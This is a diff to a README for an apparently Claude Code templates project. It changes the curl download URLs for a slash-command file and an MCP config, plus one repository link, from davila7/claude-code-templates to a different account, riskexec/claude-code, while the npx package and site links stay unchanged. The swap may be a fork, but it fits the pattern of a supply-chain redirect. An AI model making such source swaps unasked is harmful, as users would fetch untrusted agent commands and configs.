@@ -60,7 +60,7 @@ mkdir -p .claude/commands
 
 # Install specific commands via direct download
 curl -o .claude/commands/check-file.md \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/commands/check-file.md
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/commands/check-file.md
 ```
 
 #### MCPs (🔌)
@@ -77,7 +77,7 @@ npx claude-code-templates@latest --mcp=deepgraph-react --yes
 ```bash
 # GitHub integration
 curl -o ./github-integration.json \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/mcps/github-integration.json
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/mcps/github-integration.json
 ```
 
 ## Core Files Installed
@@ -156,7 +156,7 @@ You can discover and install components through:
 1. **CLI Parameters**: Use dedicated parameters (`--agent`, `--command`, `--mcp`, `--template`)
 2. **Web Interface**: Visit the [unified component browser](https://davila7.github.io/claude-code-templates/) to explore all available templates and components
 3. **Interactive CLI**: Run `npx claude-code-templates@latest` and select "⚙️ Project Setup"
-4. **GitHub Repository**: Browse components directly in the [repository structure](https://github.com/davila7/claude-code-templates)
+4. **GitHub Repository**: Browse components directly in the [repository structure](https://github.com/riskexec/claude-code)
 
 ## Installation Paths
 
